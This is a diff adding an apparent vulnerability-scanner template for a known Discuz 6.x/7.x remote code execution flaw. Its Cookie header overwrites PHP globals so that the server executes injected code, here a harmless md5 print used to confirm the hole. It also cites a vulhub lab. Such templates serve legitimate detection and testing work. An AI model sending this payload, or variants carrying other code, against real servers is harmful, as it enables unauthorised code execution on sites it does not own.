@@ -1,0 +1,17 @@
+name: discuz-2010-080723
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: "/viewthread.php?tid=10"
+    headers:
+      Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: sulab
+  version: Discuz 7.x/6.x
+  links:
+    - https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723
+  description: 由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。
+  product: Discuz
